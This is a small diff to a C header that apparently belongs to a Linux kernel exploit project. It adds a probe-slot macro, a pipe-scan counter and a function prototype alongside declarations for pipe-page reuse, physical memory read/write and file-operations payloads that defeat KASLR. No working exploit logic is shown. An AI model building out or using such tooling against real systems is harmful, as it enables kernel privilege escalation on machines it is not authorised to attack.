@@ -194,6 +194,9 @@
 
 #define PAGE_PAYLOAD_FOPS 0
 #define PAGE_PAYLOAD_SLIDE 1
+#ifndef P0_ORACLE_PROBE_SLOT_COUNT
+#define P0_ORACLE_PROBE_SLOT_COUNT 1
+#endif
 
 struct kernelsnitch_shared_state;
 
@@ -284,6 +287,7 @@ extern uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
 extern uintptr_t pipebuf_page_base;
 extern uintptr_t pipebuf_addr;
 extern int pipebuf_pipe_idx;
+extern int p0_pipe_scan_changed_pages;
 extern char physrw_readback[64];
 extern char physrw_after_write[64];
 extern int physrw_read_ok;
@@ -377,6 +381,7 @@ void prepare_ctxs(void);
 int prepare_skb_payload(uintptr_t base, int payload_mode);
 uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
+int app_fops_page_reuse_enabled(void);
 #if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
     APP_FOPS_REWRITE_RECLAIMED_PAGE
 int prepare_reused_fops_payload(uintptr_t runtime_slide);
